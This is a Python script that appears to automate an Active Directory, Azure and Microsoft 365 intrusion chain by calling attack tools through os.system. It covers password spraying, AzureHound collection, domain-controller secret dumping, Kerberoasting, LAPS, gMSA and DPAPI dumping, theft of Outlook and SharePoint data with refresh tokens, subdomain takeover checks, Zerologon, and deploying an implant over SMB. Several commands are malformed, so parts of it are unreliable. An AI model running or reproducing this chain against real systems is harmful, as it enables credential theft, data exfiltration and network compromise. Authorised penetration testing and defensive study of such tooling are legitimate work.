import os

# User Input Script
def get_user_inputs():
    tenant = input("Enter Tenant ID/Name: ")
    target = input("Enter Target System: ")
    user = input("Enter Username: ")
    password = input("Enter Password: ")
    domain = input("Enter Domain:  ")
    hash = input("Enter Hash:  ")  # Be careful with storing plaintext passwords

    return tenant, target, user, password, domain, hash

# Execute input capture
tenant, target, user, password, domain, hash = get_user_inputs()

# Display the inputs (Remove this part for security purposes)
print(f"Tenant: {tenant}")
print(f"Target: {target}")
print(f"User: {user}")
print("Password: [HIDDEN]")
print(f"Domain: {domain}")  
print(f"Hash: {hash}")# Avoid printing sensitive data

# Initial Access
## Azure AD Login
os.system(f"python3 Credmaster/credmaster.py --plugin msol -u user -p password")
## Azure User Enumeration	
os.system(f"python3 Credmaster/credmaster.py --plugin office -u users.txt --threads 15")	

# Discovery
## Azure Dump AD	
os.system(f"python3 AzureHound/azurehound -r 0.****************************MQ -t tenant list az-ad -o azurehound_ad.json")

# Credential Access
## Azure Entra Connect Dump	
os.system(f"python3 adconnectdump/adconnectdump.py -outputfile output -target-ip target -dc-ip domain -u user -p password --fetch-only")
os.system(f"python3 adconnectdump/adconnectdump.py -outputfile output -target-ip target -dc-ip domain -u user -p password --from-file key_data.json")

# Reconnaissance
## Azure Find Tenants	(possible TenantHunter?)
os.system(f"python3 TenantHunter/tenanthunter.py --domains domains.txt")

# Initial Access
## Azure Verify Tokens
os.system(f"python3 azure-ad-verify-token -t tenant -r 0.****************************s4")

# Collection,Discovery
## Bloodhound Collection	
os.system(f"python3 bloodhound-python -c Session -u user-p password -ns target -dc dc01.domain -d domain--zip --outputprefix")	

# Discovery,Reconnaissance
## DNS Recon	
os.system(f"python3 dnsrecon -n target -d domain-t std,axfr -j output.json --disable_check_bindversion")
os.system(f"python3 dnsrecon -n target -d domain -t std,axfr -j output.json --disable_check_bindversion --tcp")
## DNS Zone Lookup	
os.system(f"dig @target -x target -p 53 +nocookie +short")			
os.system(f"dig @target-x target -p 53 +nocookie +short +tcp")
## Subdomain Resolver	
os.system(f"massdns -r trusted_resolvers.txt -o J -w output.ndjson -s 10 subdomains.txt")
## Wildcard Domain Checker	
os.system(f"massdns -r trusted_resolvers.txt -o J -w output.ndjson -s 10 subdomains.txt")
# Resource Development
## Subdomain Takeover
os.system(f"subjack -c subjack-fingerprints.json -w subdomains.txt -o output.txt")		
os.system(f"subjack -m -c subjack-fingerprints.json -w subdomains.txt -o output.txt")

# Credential Access,Lateral Movement
## Dump Domain Controller Secrets
os.system(f"impacket-secretsdump -user-status -pwd-last-set -just-dc-ntlm user:password@target")
os.system(f"impacket-secretsdump -just-dc-user user -just-dc-ntlm -user-status user:password")
os.system(f"impacket-secretsdump -just-dc-user user -just-dc-ntlm -user-status -hashes hash user@target")

# Initial Access
## Entra ID Verify Kerberos Ticket	
os.system(f"python impacket-ticketer -t tenant -k user.ccache -r msgraph")

# Discovery
## Enumerate ADCS	
os.system(f"python3 Certipy/certipy.py find domain/user:password")		
os.system(f"python3 Certipy/certipy.py find domain/user@target-hashes hash ")			

## Enumerate Domain Administrators
os.system(f"windapsearch/windapsearch --dc 10.0.20.1 -d domain -u user@domain-p password -m domain-admins --attrs sAMAccountName --port 389")		

## Enumerate Domain Name	
os.system(f"impacket-smbclient -t target -u user")			

## Enumerate Domain Users	
os.system(f"ldapsearch -t target -p 389 -f person --username user --password password --domain domain")			

## Enumerate Entra/AzureAD Connect	
os.system(f"python3 azurenum/azurenum.py -t targets.txt --username user --password password --domain domain")			

# Credential Access
## Enumerate Group Managed Service Accounts	
os.system(f"python3 gMSADumper/gMSADumper.py -ua user -p password -l target:3268 -t tenant")		
os.system(f"python3 gMSADumper/gMSADumper.py -ua user -p password -l target:3268 -t tenant")

## Enumerate LAPS
os.system(f"python3 LAPSDumper/laps.py -u user -p password -d domain")			

# Discovery
## Enumerate Password Policy
os.system(f"polenum -d target -u user-p password")		

# Collection,Discovery
## Enumerate SMB Shares	
os.system(f"smbclient '\\\\target\\C$' -c recurse;ls -U user%hash --pw-nt-hash")

# Discovery,Reconnaissance
## Host Discovery	
os.system(f"nmap -n -sn -PE -PP -oX - -iL scope.txt")
## TCP Port Scan	
os.system(f"nmap -n -Pn --open -p- --source-port 53 -T4 --host-timeout 30m -max-retries 3 -min-hostgroup 32 -iL scope.txt -oX -")
os.system(f"nmap -n -Pn --open --source-port 53 -T4 --host-timeout 15m -iL scope.txt -oX -")
## UDP Port Scan	
os.system(f"nmap -n -Pn -sU --open --source-port 53 -F --max-scan-delay 1s --max-retries 3 -iL scope.txt -oX -")
## EternalBlue Check	
os.system(f"nmap -n -Pn -sV -p 445 --script smb-vuln-ms17-010 -iL scope.txt -oX	-")
## Fingerprint Generic Banner	
os.system(f"nmap -n -Pn -p 22 --script banner --script-timeout 5m --host-timeout 15m -iL scope.txt -oX -")
## Service Enumeration	
os.system(f"nmap -n -Pn -p 49983,49674,49672,22,49666,49670,49665,3389,135,49675,445,49671,47001,49700,5985,49691,139,49678,49708,9389,65446,49664,49667,49684,49669,49668 --open --source-port 53 -T4 --script http-catch-all.nse --script-timeout 1m --host-timeout 15m -iL scope.txt -oX -")
os.system(f"nmap -n -Pn -p 389,135,139,3268,53,88,22,464,593,3389,636,445,3269 -sV --open --source-port 53 -T4 --script-timeout 5m --host-timeout 15m -iL scope.txt -oX -")
os.system(f"nmap -n -Pn -sU -p 53,123 --version-intensity 5 -sV --open --script-timeout 5m --source-port 53 -T4 --host-timeout 15m -iL scope.txt -oX -")
## SMB MS10-054 Check	
os.system(f"nmap -n -Pn -sV -p 445 --script smb-vuln-ms10-054 -iL scope.txt -oX -")
## SMB MS10-061 Check	
os.system(f"nmap -n -Pn -sV -p 445 --script smb-vuln-ms10-061 -iL scope.txt -oX -")
## SMB Protocol Version Scan	
os.system(f"nmap -n -Pn -sV -p 445 --script smb-protocols -iL scope.txt -oX -")

## Gather Host Information	
os.system(f"nxc smb target")
## Check SMB Permissions	
os.system(f"nxc smb scope.txt -u user -H hash -d domain")
## List SMB Shares	
os.system(f"nxc smb target -u user -H hash -d domain --shares")
# Credential Access,Initial Access,Lateral Movement
## SMB Guest	
os.system(f"nxc smb target -u Guest -p "" --shares")
## Dump DPAPI Secrets
os.system(f"nxc smb target -u user -p password -d domain --dpapi")

# Discovery,Reconnaissance
## HTTPX Web Scan	
os.system(f"httpx -silent -no-color -no-stdin -location -favicon -jarm -title -server -tech-detect -ip -probe -tls-grab -disable-update-check -json -include-response-header -body-preview -follow-redirects -max-redirects 5 -timeout 5 -u 10.0.20.1 -p 9389 -o output.json -r /etc/resolv.conf")

# Credential Access
## Kerberoast	
os.system(f"impacket-GetUserSPNs -dc-ip target -request domain/user:password -outputfile hashes.txt")

# Discovery,Reconnaissance
## Kerberos Service Verification	
os.system(f"kerbrute/kerbrute -domain domain -users default_users.txt -debug -dc-ip target")
os.system(f"kerbrute/kerbrute userenum -d domain --dc target -v default_users.txt")

# Discovery
## LDAP Domain Controller Lookup	
os.system(f"ldapsearch -t target -p 3268 -g")
os.system(f"ldapsearch -t target -p 636 -g -s")

# Discovery
## LDAP Nom Nom	
os.system(f"ldapnomnom/ldapnomnom --parallel 5 --server target --input potential_users.txt")
os.system(f"ldapnomnom/ldapnomnom --parallel 5 --server target --input /opt/h3/wordlists/test-accounts.txt")
os.system(f"ldapnomnom/ldapnomnom --parallel 5 --server target --input /opt/h3/wordlists/top-formats.txt")
os.system(f"ldapnomnom/ldapnomnom --parallel 5 --server target --input /opt/h3/wordlists/service-accounts.txt")

# Collection
## Microsoft 365 Outlook	
os.system(f"python3 pilfer_microsoft365.py -u user@domain -r 0.****************************dM --app outlook")

## Microsoft 365 SharePoint	
os.system(f"python3 pilfer_microsoft365.py --username user@domain --refresh_token 0.****************************dM --app sharepoint -o output.json")

# Initial Access
## MS Entra Service Principal Login	
os.system(f"python3 entra_graph_search.py --service_principal b86e8248-f988-457e-a841-123109bdc105 --password password --tenant tenant --app_tenant f678089f-3c7f-4623-82ae-4bc7bddb92ca verify_sp_cred")

## MS08-067 Check	
#python3 msfrun.py

# Credential Access,Discovery
## Query AWS IMDS for AWS information	
#rat_cli.sh 18f27f64-6447-4f50-a602-e0b3a5ad5e30 -w aws-metadata

# Credential Access,Discovery
## Query Azure IMDS for access token information	
#rat_cli.sh 18f27f64-6447-4f50-a602-e0b3a5ad5e30 -w azure-metadata https://azure.management.com/
#rat_cli.sh 18f27f64-6447-4f50-a602-e0b3a5ad5e30 -w azure-metadata https://graph.microsoft.com/

# Discovery,Reconnaissance
## RPC Network Address Enumeration	
os.system(f"python3 oxid.py -t target -o output.json")

# Execution,Lateral Movement
## SMB Execute	
os.system(f"env IMPLANT_PROXY_COMMS=False IMPLANT_PAYLOAD_NAME=tmp-zcache.exe IMPLANT_PAYLOAD_TYPE=exe IMPLANT_HOSTING_METHOD=PUT IMPLANT_CORRELATION_ID=61f5679f-8ccc-4194-95b4-d886605c5c31 python3 implant.py")

# Discovery,Reconnaissance
## Zerologon Enumeration	
os.system(f"python3 zerologon.py target")